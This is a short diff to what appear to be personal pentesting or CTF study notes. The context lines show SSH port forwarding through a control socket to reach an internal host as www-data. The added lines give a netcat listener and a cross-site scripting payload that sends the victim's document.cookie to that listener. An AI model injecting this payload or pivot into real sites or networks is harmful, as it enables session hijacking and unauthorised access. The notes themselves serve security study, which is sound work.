@@ -8,3 +8,9 @@ Studying and shit for keygen
 ssh -S /tmp/DEV DEV -O forward -L2222:10.208.50.42:22 SOCKET2
 ssh www-data@localhost -p2222
 (this may give an error, run the ssh-keygen command it shows)
+
+################################
+Cross-Site Scripting:
+################################
+nc -l 127.0.0.1 42070
+<script>document.location="http://127.0.0.1:42070/?username=" + document.cookie;</script>
